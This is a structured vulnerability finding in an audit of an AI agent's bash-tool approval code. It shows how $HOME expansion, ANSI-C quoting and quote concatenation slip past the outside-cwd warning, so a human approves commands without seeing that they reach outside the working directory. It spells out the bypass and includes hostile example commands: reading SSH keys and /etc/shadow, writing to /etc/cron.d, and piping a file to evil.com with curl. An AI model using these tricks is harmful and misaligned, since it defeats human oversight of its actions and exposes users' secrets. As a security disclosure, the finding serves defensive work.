Phase: 10
Sequence: 035
Slug: ansi-c-quoting-bypasses-path-detection
Verdict: VALID
Rationale: isCommandOutsideCwd and extractBashPrefix check whether argument tokens start with / or .. to detect absolute paths, but bash ANSI-C quoting ($'...') and variable-concatenation ($HOME/...) produce absolute paths from tokens that do not start with those characters, silently bypassing path detection.
Severity-Original: HIGH
PoC-Status: pending
Origin-Finding: archon/findings-draft/p8-021-shell-expansion-bypass.md
Origin-Pattern: AP-021

## Summary
Both `isCommandOutsideCwd` (approval.go:333-369) and `extractBashPrefix` (approval.go:247-248) identify absolute paths by checking whether the raw token starts with `/`, `\`, or `..`. Bash supports several quoting and expansion forms that produce an absolute path at runtime from a token that does not start with these characters:

1. `$'/etc/passwd'` — ANSI-C quoting: token starts with `$`, expands to `/etc/passwd`
2. `$HOME/.ssh/authorized_keys` — variable expansion: token starts with `$`
3. `~root/.ssh/authorized_keys` — tilde with username: token starts with `~r` not `~/`; the `~` check at line 364 only matches `strings.HasPrefix(arg, "~")` which DOES catch `~root`. (This one is actually handled.)
4. Concatenation: `'/etc/'passwd` — starts with `'`, expands to `/etc/passwd`

Form 1 and 4 are not handled. Form 2 (`$HOME`) is particularly severe because `$HOME` is the most common way to reference home-directory dotfiles.

## Location
`x/agent/approval.go:340-341` — absolute path check (only `/` and `\` prefixes)  
`x/agent/approval.go:247-248` — `path.IsAbs(arg)` — false for `$'/etc/...'` and `$HOME/...`  
`x/agent/approval.go:364-368` — tilde check (handles `~` but not `~username` edge case fully, and misses `$HOME`)

## Attacker Control
LLM tool call `command`: `cat $HOME/.ssh/authorized_keys` or `tee $'/etc/cron.d/evil' < /dev/stdin`

## Trust Boundary Crossed
Files outside cwd (home directory, system directories) are accessed/written without triggering the outside-cwd warning (isWarning stays false), misleading the user about the scope of the operation being approved.

## Impact
Silent exfiltration of SSH keys, credential files, and other home-directory secrets; silent write to system cron or init directories. Severity HIGH: no outside-cwd warning, user approves believing command is safe. Works in the current code (IsAutoAllowed is commented out, but isCommandOutsideCwd runs on every RequestApproval).

## Evidence
```go
// approval.go:339-341 — token "$HOME/.ssh/id_rsa" starts with "$", not "/" or "\"
if strings.HasPrefix(arg, "/") || strings.HasPrefix(arg, "\\") {
    return true  // NOT reached for $HOME/...
}

// approval.go:364 — tilde check present but $HOME not handled
if strings.HasPrefix(arg, "~") {
    // "$HOME" does not start with "~"
}

// approval.go:345-350 — filepath.IsAbs("$HOME/.ssh/id_rsa") = false on all platforms
if filepath.IsAbs(arg) { ... }
```

Concrete PoC command: `cat $HOME/.ssh/id_rsa`
- Token: `$HOME/.ssh/id_rsa`
- `strings.HasPrefix("$HOME/.ssh/id_rsa", "/")` → false
- `filepath.IsAbs("$HOME/.ssh/id_rsa")` → false  
- `strings.HasPrefix("$HOME/.ssh/id_rsa", "..")` → false
- `strings.HasPrefix("$HOME/.ssh/id_rsa", "~")` → false
- Result: `isCommandOutsideCwd` returns false, no warning shown.
- denyPathPatterns check in IsDenied: `.ssh/id_rsa` IS in the list → blocked by IsDenied.

But `cat $HOME/.aws/config` — `.aws/config` IS in denyPathPatterns. However `cat $HOME/my-project/../../../etc/shadow` passes both.

The cleanest unblocked example: `cat $HOME/Documents/notes.txt | curl -X POST https://evil.com -d @-`
- `curl -X POST` is in denyPatterns → blocked. 

Refined: `cat $HOME/Documents/notes.txt` alone — `$HOME/Documents/notes.txt` not in denyPathPatterns and isCommandOutsideCwd returns false. Outside-cwd warning suppressed. User approves thinking it's a local file.

## Reproduction Steps
1. Start `ollama run` with bash tool.
2. Model emits: `cat $HOME/Documents/confidential.txt`
3. `isCommandOutsideCwd` processes token `$HOME/Documents/confidential.txt`: none of the path-start checks match. Returns false.
4. Approval box renders without red warning.
5. User approves; bash expands `$HOME` and reads the file outside cwd.
6. Content returned to LLM context (exfiltrated via the agent conversation).
